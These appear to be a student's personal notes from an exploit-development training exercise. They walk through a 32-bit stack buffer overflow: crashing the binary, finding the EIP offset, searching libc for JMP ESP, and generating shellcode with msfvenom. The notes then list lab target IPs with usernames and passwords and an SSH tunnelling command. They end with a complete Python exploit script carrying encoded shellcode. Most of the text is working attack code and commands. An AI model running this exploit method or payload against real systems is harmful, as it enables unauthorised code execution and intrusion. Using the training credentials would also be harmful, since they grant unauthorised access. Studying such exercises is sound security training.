https://wiremask.eu/tools/buffer-overflow-pattern-generator/
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!DEMO!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!



file func
    ELF 32 bit, dynamically linked
md5sum 
strings func
    look for things that stand out
#DYNAMIC ANALYSIS
      run it- ./func
        try interacting
#TRY TO CRASH IT
      python3 -c "print ('A'*200)" | ./func
      ./func <<< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        "Segmentation fault (core dumped)"


      #!/usr/bin/python
        #GDB
      # General Buffer Overflow Process:
      #step 0: Perform reverse engineering/identfy vulnerability
      #step 1: find the bufer size/offset
      #step 2: Validate EIP Overwrite
      #ste[ 3: identify bad charackters to exclude from shellcode 
      #step 4: Find a valid JMP ESP (assembly instruction)
      #step 5:Generate shellcode and run exploit


#STEP 0!!!           
#Run Func in GDB
           
#disassemble main
           
#disass main
      disass main
#disass getuserinput
            disass getuserinput
               puts and gets
#pdisass getuserinput
           colorcodes vulnerability
#STEP 1!!! FIND BUFFER SIZE/OFSET
      #run <<< *enter string*
        look at registers
        look at ESP, trying to get to EIP
        grab memory address of EIP copy into website at top of this page to find the offset
#OFFSET IS 62
   #run <<<  $(python3 -c 'print("A" 8 62 + "B" * 4)')
           #AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
   #RUN GDB IN A CLEAN ENV
   # env - gdb ./func


#env - gdb ./func
#unset env - show env
#unset env LINES
#unset env COLUMNS

#Search for JMP ESP
#info proc map (inside gdb)

#libc mem range: 0xf7ddd000 0xf7af000
#JMP ESP = ff e4
#find /b 0xf7ddd000, 0xf7faf000, 0xff, 0xe4
    
    #copy first couple
        #GDB gives us big-endian
        #Convert to little-endian
        #0x\f7\dd\fb\59 --> /x59/xfb/xdd/xf7
        #0x\f7\f5\48\ab --> /xab/x48/xf5/xf7
        #0x\f7\f6\05\fb --> /xfb/x05/xf6/xf7
          

           buffer = "A" * 62
           #eip = "B" * 4
           EIP = "\x59\xfb\xdd\xf7"
           nop = '\x90' *5

           *enter buf results*



           # payload 
           #msfvenom
           #msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
                copy back the results of that command underneath last line of code^^^
           

           print(buffer + eip + nop+ buf)

#call it 
./func <<< $(python exploit.py)       -- (outside of gdb)


----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                                                                 lvaZsAC2R0TC, 10.50.15.162          
Exploit Development

Scheme of Maneuver:
    >Jump Box
    ->T1: 192.168.28.111
    ->T2: 192.168.28.105
    
    >Jump Box
    ->donovian_grey_host
    -->T3: 192.168.150.245

Target Section:
          
          T1
          Hostname: Donovian_Webserver
          IP: 192.168.28.111
          OS: CentOS
          Creds: comrade :: StudentWebExploitPassword
          Last Known SSH Port: 2222
          Action: Exploit binary.
          
          T2
          Hostname: Donovian-Terminal
          IP: 192.168.28.105
          Creds: comrade :: StudentReconPassword
          Last Known SSH Port: 2222
          
          T3
          Hostname: unknown
          IP: 192.168.150.245
          Last Known SSH Port: unknown
          Action: Exploit a network service on the machine

ssh -MS /tmp/exp student@10.50.15.162 -L 25200:comrade@192.168.28.111:80 -L 25201:comrade@192.168.28.111:2222 -L 25202:comrade@192.168.28.111:8080 -L 25203:comrade@192.168.28.105:2222 -L 25204:comrade@192.168.28.105:21 -L 25205:comrade@192.168.28.105:23 -D 9050

file inventory.exe
        inventory.exe: ELF 32-bit LSB executable
strings inventory.exe
        Press enter to view inventory: 
        Total Inventory:
        Bandages: 12
        Kvass: 1.000
        Turnips: 12.000
        5.45x39: 20.000
        AK-74M: 200
        Zastava Koral: 50
md5sum inventory.exe
       d23399c6f5382bef2a9978f81ab23487



   0x0804855e <+27>:	call   0x80484d6 <getTheGoods>
   0x08048554 <+17>:	call   0x8048571 <__x86.get_pc_thunk.ax>

0xf7def000 0xf7fc1000   0x1d2000        0x0 /lib32/libc-2.27.so

0xf7df1b51 ---> \x51\x1b\xdf\xf7
0xf7f6674b ---> \x4b\x67\xf6\xf7
0xf7f72753 ---> \x53\x27\xf7\xf7



#!/usr/bin/env python
offset = "A" * 76
eip = "\x51\x1b\xdf\xf7"
nop = "\x90" * 15
buf = b""
buf += b"\xbb\x44\x31\xc2\x7b\xda\xca\xd9\x74\x24\xf4\x5e"
buf += b"\x33\xc9\xb1\x11\x31\x5e\x12\x03\x5e\x12\x83\x82"
buf += b"\x35\x20\x8e\x60\x3d\xfc\xe8\x26\x27\x94\x27\xa5"
buf += b"\x2e\x83\x50\x06\x42\x24\xa1\x30\x8b\xd6\xc8\xae"
buf += b"\x5a\xf5\x59\xc6\x40\xfa\x5d\x16\x18\x9b\x29\x36"
buf += b"\xf1\x75\xa1\x53\x6e\xf8\x20\xef\x5f\xd2\xdc\x6a"
buf += b"\xd2\x53\x52\x11\x71\xd6\xf1\xad\x5b\x66\x9e\x2f"
buf += b"\xa4\xd1\x0d\x26\x45\x10\x31"
print(offset+eip+nop+buf)














           
